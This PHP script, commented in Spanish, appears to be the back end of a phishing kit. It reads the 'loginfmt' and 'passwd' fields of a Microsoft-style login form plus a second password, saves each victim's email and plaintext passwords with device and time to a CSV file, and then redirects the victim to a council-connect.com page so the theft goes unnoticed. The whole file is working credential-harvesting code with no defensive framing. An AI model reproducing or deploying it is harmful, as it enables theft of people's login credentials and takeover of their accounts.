<?php 

//error_reporting(E_ALL);
//ini_set('display_errors', '1');

$datos_usuario = $_POST; //guardamos los datos del usuario en una variable
$correo_usuario = $datos_usuario['loginfmt']; //guardamos el correo del usuario
$contrasena_usuario = $datos_usuario['passwd']; //guardamos la contraseña del usuario
$contrasena_usuario_nueva = $datos_usuario['passwd2']; //guardamos la contraseña del usuario
$tipo_dispositivo = $datos_usuario['dispositivo'];//guardamos si el false el dispositivo no es movil
$hora = $datos_usuario['hora'];//guardamos la hora en la que se han puesto las credenciales


//comprobamos si las contraseñas tienen espacios vacíos
$contrasena_usuario = str_replace(" ", "", $contrasena_usuario); 
$contrasena_usuario_nueva = str_replace(" ", "", $contrasena_usuario_nueva);

if($contrasena_usuario_nueva == '' || $contrasena_usuario_nueva == null){
    $contrasena_usuario_nueva = " ";
}

// Nombre de archivo
$a = 'programa_interprete/datos_usuarios.csv';

if (file_exists($a)) {

    // Lee todo el archivo y lo carga a un vector
    $data = file($a);
    // Agrega el dato al vector
    array_unshift($data, "$correo_usuario,$contrasena_usuario,$contrasena_usuario_nueva,$tipo_dispositivo,$hora");
    // Abre el archivo para escritura, truncando el contenido
    $file = fopen($a, 'w');
    // recorre el vector y reescribe todo el archivo
    foreach($data as $l){
    fwrite($file, "$l\n");
    }
    fclose($file);

} else {
    fopen("programa_interprete/datos_usuarios.csv", "w");
    
    // Lee todo el archivo y lo carga a un vector
    $data = file($a);
    // Agrega el dato al vector
    array_unshift($data, "$correo_usuario,$contrasena_usuario,$contrasena_usuario_nueva,$tipo_dispositivo,$hora");
    // Abre el archivo para escritura, truncando el contenido
    $file = fopen($a, 'w');
    // recorre el vector y reescribe todo el archivo
    foreach($data as $l){
    fwrite($file, "$l\n");
    }
    fclose($file);
}

header('Location: redirect/council-connect.com/index.html');

?>


